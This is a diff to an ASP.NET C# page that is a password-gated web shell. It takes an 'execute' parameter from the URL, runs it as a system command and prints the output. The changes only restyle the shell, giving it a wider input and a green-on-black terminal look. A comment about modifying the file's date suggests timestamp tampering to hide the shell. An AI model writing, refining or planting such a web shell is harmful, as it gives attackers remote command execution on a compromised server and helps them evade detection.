@@ -11,12 +11,12 @@
             Response.Write(@"
                 <div style='position: fixed; top: 0; left: 0; width: 100%; background-color: #f0f0f0; padding: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.2);'>
                     <form method='get'>
-                        Command: <input type='text' name='execute' />
+                        Command: <input type='text' name='execute' style='width: 70%;' />
                         <input type='hidden' name='password' value='28112016' />
                         <input type='submit' value='Execute' />
                     </form>
                 </div>
-                <div style='margin-top: 80px;'>
+                <div style='margin-top: 100px;'>
             ");
 
             // تحقق إذا تم تمرير المتغير execute في URL
@@ -39,10 +39,10 @@
                         string output = process.StandardOutput.ReadToEnd();
                         string error = process.StandardError.ReadToEnd();
 
-                        Response.Write("<pre>" + output + "</pre>");
+                        Response.Write("<pre style='background-color: #000; color: #0f0; padding: 10px; font-family: Consolas, monospace;'>" + output + "</pre>");
                         if (!string.IsNullOrEmpty(error))
                         {
-                            Response.Write("<pre style='color:red;'>" + error + "</pre>");
+                            Response.Write("<pre style='background-color: #000; color: red; padding: 10px; font-family: Consolas, monospace;'>" + error + "</pre>");
                         }
 
                         // تعديل تاريخ الملف
